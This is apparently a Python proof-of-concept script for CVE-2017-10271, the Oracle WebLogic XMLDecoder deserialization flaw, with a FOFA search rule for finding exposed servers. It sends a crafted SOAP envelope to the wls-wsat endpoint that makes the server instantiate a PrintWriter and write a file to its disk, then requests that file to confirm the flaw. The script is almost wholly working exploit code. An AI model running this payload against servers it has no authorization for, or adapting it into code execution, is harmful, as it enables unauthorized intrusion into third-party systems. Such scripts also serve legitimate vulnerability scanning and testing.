#!/usr/bin/env python3
# _*_ coding:utf-8 _*_


import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 脚本信息
######################################################
NAME='CVE_2017_10271'
AUTHOR = "Faith"
REMARK = 'Weblogic XML Decoder反序列化漏洞'
FOFA_RULE='app="Oracle-BEA-WebLogic-Server"'
######################################################
def poc(target):
    result={}
    url = target + '/wls-wsat/CoordinatorPortType'
    headers = {"User-Agent": 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
           'Upgrade-Insecure-Requests': '1',
           'Content-Type': 'text/xml'}
    data = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.6.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter">
                        <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/test.txt</string><void method="println">
                        <string>xmldecoder_vul_test</string></void><void method="close"/>
                    </object>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>
    '''
    r = requests.post(url,headers=headers,data=data,timeout=3)
    url1 = target + '/wls-wsat/test.txt'
    r1 = requests.get(url1,headers=headers,timeout=3)
    try:
        if 'xmldecoder_vul_test' in r1.text:
            result['target'] = target
            result['poc'] = NAME
            result['url'] = url
            return result
        else:
            pass
    except:
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")